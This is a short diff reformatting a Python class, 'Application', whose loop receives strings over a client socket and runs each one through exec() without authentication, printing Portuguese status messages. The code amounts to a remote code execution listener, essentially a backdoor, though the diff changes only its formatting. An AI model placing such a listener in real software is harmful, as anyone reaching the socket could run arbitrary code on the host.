@@ -19,13 +19,12 @@ class Application:
         try:
             while True:
                 payload = client_socket.recv(4096).decode('utf-8')
-                if not payload:
-                    break
+                if not payload: break
+
                 print(f"[>] Executando:\n{payload}")
-                try:
-                    exec(payload)
-                except Exception as e:
-                    print(f"[!] Erro ao executar: {e}")
+                
+                try: exec(payload)
+                except Exception as e: print(f"[!] Erro ao executar: {e}")
         finally:
             print(f"[-] Conexão encerrada: {addr}")
             client_socket.close()
